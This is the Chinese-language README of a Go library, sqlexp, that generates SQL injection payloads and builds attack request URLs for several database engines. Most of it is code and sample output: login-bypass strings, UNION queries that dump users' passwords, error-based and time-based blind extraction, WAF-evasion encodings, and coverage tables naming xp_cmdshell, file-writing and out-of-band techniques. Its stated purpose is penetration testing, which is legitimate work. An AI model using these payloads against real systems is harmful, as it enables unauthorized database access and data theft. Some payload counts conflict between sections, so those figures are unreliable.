# sqlexp - SQL注入利用库

SQL注入渗透测试的Payload生成与利用工具库，支持多种数据库类型、注入方法和WAF绕过。

## 引入

```go
import "github.com/xiguayiqiu/gyscan_code/sqlexp"
```

---

## 极简 API

```go
// 获取Union注入Payload
payloads := sqlexp.Union(sqlexp.MySQL)

// 获取报错注入Payload
payloads := sqlexp.Error(sqlexp.MySQL)

// 获取延时注入Payload
payloads := sqlexp.Time(sqlexp.PostgreSQL)

// 获取WAF绕过Payload
payloads := sqlexp.WAFBypass(sqlexp.BypassCommentInline)

// 获取登录绕过Payload
payloads := sqlexp.LoginBypass()

// 获取数据库指纹Payload
payloads := sqlexp.Fingerprint()

// 链式配置
sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.UnionBased).
    Columns(3).
    Target("http://example.com/page.php").
    Param("id").
    BuildRequests()
```

---

## 类型定义

### DBType - 数据库类型

| 常量 | 值 | 说明 |
|------|-----|------|
| `sqlexp.MySQL` | 0 | MySQL/MariaDB |
| `sqlexp.PostgreSQL` | 1 | PostgreSQL |
| `sqlexp.MSSQL` | 2 | Microsoft SQL Server |
| `sqlexp.Oracle` | 3 | Oracle Database |
| `sqlexp.SQLite` | 4 | SQLite |
| `sqlexp.Access` | 5 | Microsoft Access |

```go
sqlexp.MySQL.String()      // "mysql"
sqlexp.PostgreSQL.String() // "postgresql"
sqlexp.MSSQL.String()      // "mssql"
```

### Method - 注入方法

| 常量 | 值 | 说明 |
|------|-----|------|
| `sqlexp.ErrorBased` | 0 | 报错注入 |
| `sqlexp.UnionBased` | 1 | 联合查询注入 |
| `sqlexp.BooleanBlind` | 2 | 布尔盲注 |
| `sqlexp.TimeBlind` | 3 | 延时盲注 |
| `sqlexp.StackedQuery` | 4 | 堆叠查询注入 |
| `sqlexp.InlineQuery` | 5 | 内联注入 |
| `sqlexp.OutOfBand` | 6 | OOB外带注入 |

```go
sqlexp.ErrorBased.String()  // "error"
sqlexp.UnionBased.String()  // "union"
sqlexp.TimeBlind.String()   // "time"
```

### BypassType - WAF绕过类型

| 常量 | 值 | 说明 |
|------|-----|------|
| `sqlexp.BypassCommentInline` | 0 | 内联注释绕过 |
| `sqlexp.BypassCaseVary` | 1 | 大小写变换绕过 |
| `sqlexp.BypassDoubleURL` | 2 | 双重URL编码绕过 |
| `sqlexp.BypassHexEncode` | 3 | Hex编码绕过 |
| `sqlexp.BypassWhitespace` | 4 | 空白字符替换绕过 |
| `sqlexp.BypassNullByte` | 5 | Null字节绕过 |
| `sqlexp.BypassKeywordSplit` | 6 | 关键字拆分绕过 |
| `sqlexp.BypassHTTPParam` | 7 | HTTP参数污染绕过 |

---

## Payload 获取函数

### 按注入方法获取

| 函数 | 说明 | 返回值 |
|------|------|--------|
| `sqlexp.Union(db)` | 获取Union注入Payload | `[]string` |
| `sqlexp.Error(db)` | 获取报错注入Payload | `[]string` |
| `sqlexp.Boolean(db)` | 获取布尔盲注Payload | `[]string` |
| `sqlexp.Time(db)` | 获取延时盲注Payload | `[]string` |
| `sqlexp.Stacked(db)` | 获取堆叠查询Payload | `[]string` |
| `sqlexp.Inline()` | 获取内联注入Payload | `[]string` |
| `sqlexp.OOB()` | 获取OOB外带Payload | `[]string` |

```go
unionPayloads := sqlexp.Union(sqlexp.MySQL)
// 输出示例:
// ' UNION SELECT NULL-- -
// ' UNION SELECT NULL,NULL-- -
// ' UNION SELECT @@version,NULL,NULL-- -

errorPayloads := sqlexp.Error(sqlexp.PostgreSQL)
// 输出示例:
// ' AND CAST((SELECT version()) AS INT)-- -

timePayloads := sqlexp.Time(sqlexp.MSSQL)
// 输出示例:
// ';WAITFOR DELAY '0:0:5'--
```

### 专项获取

| 函数 | 说明 | 返回值 |
|------|------|--------|
| `sqlexp.Fingerprint()` | 获取数据库指纹Payload | `[]string` |
| `sqlexp.LoginBypass()` | 获取登录绕过Payload | `[]string` |
| `sqlexp.WAFBypass(t)` | 获取WAF绕过Payload | `[]string` |
| `sqlexp.UnionProbe(db, cols)` | 获取Union列数探测Payload | `[]string` |
| `sqlexp.TimeExtract(db, cond)` | 获取延时注入数据提取Payload | `string` |
| `sqlexp.ErrorExtract(db, target)` | 获取报错注入数据提取Payload | `string` |
| `sqlexp.BooleanExtract(db, cond)` | 获取布尔注入条件Payload | `string` |

```go
// 登录绕过
payloads := sqlexp.LoginBypass()
// admin'-- -
// admin' #
// ' OR '1'='1
// ...

// Union列数探测
probes := sqlexp.UnionProbe(sqlexp.MySQL, 3)
// ' UNION SELECT NULL-- -
// ' UNION SELECT NULL,NULL-- -
// ' UNION SELECT NULL,NULL,NULL-- -
// ' UNION SELECT NULL,NULL,NULL,NULL-- -

// 报错提取当前用户
result := sqlexp.ErrorExtract(sqlexp.MySQL, "SELECT user()")
// ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -

// 延时提取条件
result := sqlexp.TimeExtract(sqlexp.PostgreSQL, "current_database() LIKE 'a%'")
// ' AND (SELECT CASE WHEN (current_database() LIKE 'a%') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

// 布尔提取条件
result := sqlexp.BooleanExtract(sqlexp.MySQL, "LENGTH(database())=5")
// ' AND (LENGTH(database())=5)-- -
```

---

## Exploit 链式调用

`Exploit` 结构体提供了灵活的链式调用API，支持复杂的Payload构建和URL编码。

### 创建实例

```go
e := sqlexp.NewExploit()
```

### 配置方法

| 方法 | 参数 | 说明 | 默认值 |
|------|------|------|--------|
| `.DB(db)` | DBType | 设置数据库类型 | MySQL |
| `.Method(m)` | Method | 设置注入方法 | UnionBased |
| `.Prefix(p)` | string | 设置Payload前缀 | `'` |
| `.Suffix(s)` | string | 设置Payload后缀 | `-- -` |
| `.Target(url)` | string | 设置目标URL | `""` |
| `.Param(p)` | string | 设置参数名 | `""` |
| `.Columns(n)` | int | 设置Union列数 | 3 |
| `.Table(t)` | string | 设置目标表名 | `users` |
| `.Column(c)` | string | 设置目标列名 | `password` |
| `.Sleep(n)` | int | 设置延时秒数 | 5 |
| `.WAFBypass(b)` | bool | 启用WAF绕过 | false |
| `.Bypass(t)` | BypassType | 设置绕过类型 | BypassCommentInline |

### 输出方法

| 方法 | 说明 | 返回值 |
|------|------|--------|
| `.GetPayloads()` | 获取当前配置的Payload列表 | `[]string` |
| `.GetUnionProbe()` | 获取Union列数探测Payload | `[]string` |
| `.GetUnionDump()` | 获取Union数据提取Payload | `string` |
| `.GetErrorExtract(target)` | 获取报错注入提取Payload | `string` |
| `.GetTimeExtract(condition)` | 获取延时注入提取Payload | `string` |
| `.GetBooleanExtract(condition)` | 获取布尔注入条件Payload | `string` |
| `.GetFingerprint()` | 获取数据库指纹Payload | `[]string` |
| `.GetLoginBypass()` | 获取登录绕过Payload | `[]string` |
| `.URLEncode(payload)` | URL编码Payload | `string` |
| `.DoubleURLEncode(payload)` | 双重URL编码Payload | `string` |
| `.HexEncode(payload)` | Hex编码Payload | `string` |
| `.BuildRequest()` | 构建单条请求URL | `string` |
| `.BuildRequests()` | 构建所有请求URL列表 | `[]string` |

---

## 使用示例

### 基础Payload获取

```go
// MySQL Union注入所有Payload
payloads := sqlexp.Union(sqlexp.MySQL)
for _, p := range payloads {
    fmt.Println(p)
}
```

### 链式调用获取Payload

```go
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.UnionBased).
    Columns(5).
    Table("users").
    Column("password")

// 获取所有Union注入Payload
payloads := e.GetPayloads()

// 获取Union列数探测
probes := e.GetUnionProbe()
// ' UNION SELECT NULL-- -
// ' UNION SELECT NULL,NULL-- -
// ...
// ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -

// 获取Union数据提取Payload
dump := e.GetUnionDump()
// ' UNION SELECT password,0,1,2,3 FROM users-- -
```

### 构建完整请求

```go
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.UnionBased).
    Target("http://example.com/page.php").
    Param("id")

// 构建所有请求URL
requests := e.BuildRequests()
// http://example.com/page.php?id=%27%27%20UNION%20SELECT%20NULL--%20-

// 构建单条请求
req := e.BuildRequest()
```

### 报错注入使用

```go
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.ErrorBased)

// 获取预定义报错Payload
payloads := e.GetPayloads()

// 自定义提取目标
extractUser := e.GetErrorExtract("SELECT user()")
// ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -

extractDB := e.GetErrorExtract("SELECT database()")
// ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -
```

### 延时注入使用

```go
// MySQL延时注入
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Sleep(5)

payload := e.GetTimeExtract("ASCII(SUBSTRING((SELECT database()),1,1))>64")
// ' AND IF((ASCII(SUBSTRING((SELECT database()),1,1))>64),SLEEP(5),0)-- -

// PostgreSQL延时注入
e2 := sqlexp.NewExploit().
    DB(sqlexp.PostgreSQL).
    Sleep(3)

payload2 := e2.GetTimeExtract("current_database() LIKE 'a%'")
// ' AND (SELECT CASE WHEN (current_database() LIKE 'a%') THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -

// MSSQL延时注入
e3 := sqlexp.NewExploit().DB(sqlexp.MSSQL).Sleep(5)
payload3 := e3.GetTimeExtract("DB_NAME() LIKE 'a%'")
// ';IF(DB_NAME() LIKE 'a%') WAITFOR DELAY '0:0:5'--
```

### WAF绕过

```go
// 内联注释绕过
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Bypass(sqlexp.BypassCommentInline)

payloads := e.GetPayloads()
// '/**/UNION/**/SELECT/**/NULL--
// '/*!UNION*//*!SELECT*/NULL--
// 'UnIoN SeLeCt NuLl--
// ...

// 大小写变化绕过
payloads := sqlexp.WAFBypass(sqlexp.BypassCaseVary)

// 双重URL编码绕过
payloads := sqlexp.WAFBypass(sqlexp.BypassDoubleURL)

// Hex编码绕过
payloads := sqlexp.WAFBypass(sqlexp.BypassHexEncode)
```

### URL编码

```go
e := sqlexp.NewExploit()

raw := "' UNION SELECT NULL-- -"

// 标准URL编码
encoded := e.URLEncode(raw)
// %27%20UNION%20SELECT%20NULL--%20-

// 双重URL编码
doubleEncoded := e.DoubleURLEncode(raw)
// %2527%2520UNION%2520SELECT%2520NULL--%2520-

// Hex编码
hexEncoded := e.HexEncode(raw)
// %27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2D%2D%20%2D
```

### 全量Payload获取

```go
// 获取MySQL所有注入方法的Payload
all := sqlexp.AllPayloads(sqlexp.MySQL)
for method, payloads := range all {
    fmt.Printf("[%s] 共%d条\n", method, len(payloads))
}
// 输出:
// [error] 共6条
// [union] 共22条
// [boolean] 共9条
// [time] 共7条
// [stacked] 共10条
// [inline] 共6条
// [oob] 共7条
```

### 工具函数

```go
// 获取数据库注释符
comment := sqlexp.CommentFor(sqlexp.MySQL)   // "-- -"
comment := sqlexp.CommentFor(sqlexp.MSSQL)   // "--"

// 字符串拼接
concat := sqlexp.StrConcatFor(sqlexp.MySQL, "a", "b")  // "CONCAT(a,b)"
concat := sqlexp.StrConcatFor(sqlexp.MSSQL, "a", "b")  // "a+b"
```

---

## Payload 覆盖范围

### 报错注入 (ErrorBased)

| 数据库 | Payload数 | 覆盖技术 |
|--------|----------|----------|
| MySQL | 7 | EXTRACTVALUE, UPDATEXML, FLOOR-RAND, EXP, GROUP BY, NAME_CONST |
| PostgreSQL | 4 | CAST INT, CAST NUMERIC |
| MSSQL | 4 | CONVERT INT, DBMS_UTILITY |
| Oracle | 4 | CTXSYS, UTL_INADDR, ORD_DICOM |
| SQLite | 2 | LOAD_EXTENSION, 条件ABS |

### 联合查询注入 (UnionBased)

| 数据库 | Payload数 | 覆盖内容 |
|--------|----------|----------|
| MySQL | 16 | 列数探测(1-10列), 版本/数据库/用户, information_schema枚举 |
| PostgreSQL | 10 | 列数探测(1-5列), 版本/数据库/用户, pg_catalog枚举 |
| MSSQL | 10 | 列数探测(1-5列), 版本/数据库, master/sysobjects枚举 |

### 布尔盲注 (BooleanBlind)

| 数据库 | Payload数 | 覆盖内容 |
|--------|----------|----------|
| MySQL | 9 | 真假条件, OR永真, SUBSTRING/ASCII提取, LENGTH判断 |
| MSSQL | 5 | 真假条件, SUBSTRING/LEN提取 |

### 延时盲注 (TimeBlind)

| 数据库 | Payload数 | 覆盖技术 |
|--------|----------|----------|
| MySQL | 7 | SLEEP, BENCHMARK, IF条件, 数据提取 |
| PostgreSQL | 3 | pg_sleep, CASE WHEN |
| MSSQL | 3 | WAITFOR DELAY, IF条件 |
| Oracle | 3 | DBMS_LOCK.SLEEP |
| SQLite | 2 | RANDOMBLOB, 条件HEAVY |

### 堆叠查询 (StackedQuery)

| 数据库 | Payload数 | 覆盖操作 |
|--------|----------|----------|
| MySQL | 6 | INSERT/UPDATE/DELETE/DROP, LOAD_FILE, INTO OUTFILE |
| MSSQL | 3 | xp_cmdshell, sp_configure启用 |
| PostgreSQL | 3 | CREATE TABLE, COPY写文件, DROP TABLE |

### 外带注入 (OutOfBand)

| 数据库 | Payload数 | 覆盖技术 |
|--------|----------|----------|
| MySQL | 1 | LOAD_FILE SMB UNC |
| MSSQL | 2 | xp_dirtree, xp_subdirs |
| Oracle | 3 | UTL_INADDR, UTL_HTTP, DBMS_LDAP |
| PostgreSQL | 1 | COPY PROGRAM |

### WAF绕过

| 绕过类型 | Payload数 | 覆盖技术 |
|---------|----------|----------|
| 内联注释 | 15 | /**/, /*!...*/, TAB/换行/回车, 大小写, URL编码, 括号包裹 |
| Hex编码 | 4 | 0x前缀, CHAR, UNHEX, CONV |

---

## 测试

```bash
cd /home/yiqiu/projects/gyscan_code
go test ./sqlexp/ -v
```

---

## License

Apache License 2.0